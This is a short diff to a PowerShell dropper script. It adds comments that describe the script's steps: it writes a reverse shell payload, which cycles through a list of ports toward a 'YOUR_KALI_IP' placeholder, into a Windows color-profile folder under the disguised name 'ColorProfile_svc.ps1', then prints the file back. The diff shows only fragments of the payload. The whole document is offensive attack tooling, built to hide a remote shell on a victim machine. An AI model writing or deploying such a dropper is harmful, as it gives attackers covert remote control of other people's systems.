@@ -1,5 +1,7 @@
+# drops the reverse shell .ps1 into a disguised windows system path
 $dir = "C:\Windows\System32\spool\drivers\color"
 
+# full reverse shell payload written as a here-string so special chars are preserved
 $payload = @'
 $ports = @(80, 443, 8080, 3306, 4444, 5985, 8443)
 $ip    = "YOUR_KALI_IP"
@@ -31,6 +33,9 @@ while ($true) {
 }
 '@
 
+# write payload to disk at disguised path
 $payload | Out-File -FilePath "$dir\ColorProfile_svc.ps1" -Encoding ASCII
 Write-Host "[+] Payload written. Verifying..."
+
+# print file contents to confirm it wrote correctly before trusting it
 Get-Content "$dir\ColorProfile_svc.ps1"
